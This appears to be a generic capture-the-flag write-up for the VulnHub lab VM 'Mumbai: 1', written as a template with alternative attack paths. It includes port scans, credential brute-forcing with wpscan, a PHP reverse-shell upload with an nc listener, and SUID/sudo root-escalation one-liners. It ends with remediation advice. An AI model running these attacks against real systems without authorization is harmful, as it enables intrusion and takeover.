# Mumbai: 1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.x |
| **Attacker IP** | 192.168.1.y (Kali Linux) |
| **Difficulty** | Easy/Medium |
| **OS** | Linux |
| **Goal** | root flag |
| **Source** | [HackingArticles](https://www.hackingarticles.in/mumbai1-vulnhub-walkthrough/) |

---

## Attack Summary

Mumbai: 1 is a Linux boot-to-root VM available on VulnHub. The attack path begins with port scanning to identify web services, followed by web directory enumeration that exposes a login panel or file upload mechanism. Initial access is achieved through credential discovery or exploitation of a web vulnerability. Privilege escalation leverages a misconfigured sudo rule or SUID binary to obtain a root shell.

---

## Methodology

1. Host discovery and port scan
2. Web service enumeration
3. Credential discovery or web exploitation for initial foothold
4. Shell stabilization
5. Privilege escalation via sudo or SUID abuse
6. Root flag capture

---

## Step 1: Host Discovery and Port Scan

Identify the target on the local network:

```bash
netdiscover
```

Run a comprehensive service scan:

```bash
nmap -sV -sC -p- 192.168.1.x
```

Typical open ports on this VM:
- 22 — SSH
- 80 — HTTP

![Nmap scan results](images/01-nmap.png)

---

## Step 2: Web Enumeration

Browse to `http://192.168.1.x`. Perform directory brute-forcing to find hidden paths:

```bash
gobuster dir -u http://192.168.1.x \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt
```

Look for:
- Login panels
- Upload directories
- Configuration or backup files
- CMS indicators (WordPress, Joomla, etc.)

```bash
nikto -h http://192.168.1.x
```

![Web enumeration](images/02-web-enum.png)

---

## Step 3: Initial Access

### Option A — Credential Discovery

If a login panel is found, check for default credentials. Common defaults:
- `admin:admin`
- `admin:password`
- `admin:123456`

If the application is a known CMS, enumerate users:

```bash
wpscan --url http://192.168.1.x -e u
```

Then brute-force with rockyou:

```bash
wpscan --url http://192.168.1.x -U admin -P /usr/share/wordlists/rockyou.txt
```

### Option B — File Upload / RCE

If a file upload is found, upload a PHP reverse shell (pentestmonkey):

```bash
# Edit the shell to set $ip and $port
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Start a listener and trigger the uploaded file:

```bash
nc -lvnp 4444
```

### Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

![Initial shell](images/03-initial-shell.png)

---

## Step 4: Post-Exploitation Enumeration

Once a shell is obtained, enumerate the system for privilege escalation vectors:

```bash
# User context
id; whoami; hostname

# Sudo permissions
sudo -l

# SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# World-writable files
find / -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null

# SUID/SGID
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null
```

---

## Step 5: Privilege Escalation

### Via Sudo Misconfiguration

If `sudo -l` reveals a command that can be run as root:

```bash
sudo <allowed_command>
# or if a script is writable:
echo '/bin/bash -i' >> /path/to/script
sudo /path/to/script
```

### Via SUID Binary

If a non-standard SUID binary is found, check GTFOBins for an exploit vector:

```bash
# Example: SUID find
find . -exec /bin/sh -p \; -quit

# Example: SUID nmap (older versions)
nmap --interactive
!sh
```

![Privilege escalation](images/04-privesc.png)

---

## Step 6: Root Flag

After obtaining a root shell:

```bash
id
cd /root
ls -la
cat root.txt
```

![Root flag](images/05-root-flag.png)

---

## Lessons Learned

- Exposed web services on internet-facing or lab machines should not use default or weak credentials.
- File upload functionality must validate file type server-side, not just on the client side.
- Sudo rules granting shell-escape-capable commands to non-root users are a critical privilege escalation risk.
- SUID binaries should be audited regularly; only standard system binaries should have the SUID bit set.
- Defense-in-depth requires monitoring for unusual process spawning from web server processes.

---

## Remediation

| Vulnerability | Fix |
|---|---|
| Default or weak web app credentials | Enforce password complexity; change defaults before deployment |
| Unrestricted file upload | Whitelist allowed extensions; store uploads outside the web root |
| Overly permissive sudo rules | Apply principle of least privilege; avoid `NOPASSWD` for shells |
| Custom SUID binaries | Audit and remove unnecessary SUID bits; prefer capabilities |
| Missing web application firewall | Deploy WAF rules to block shell upload and command injection attempts |
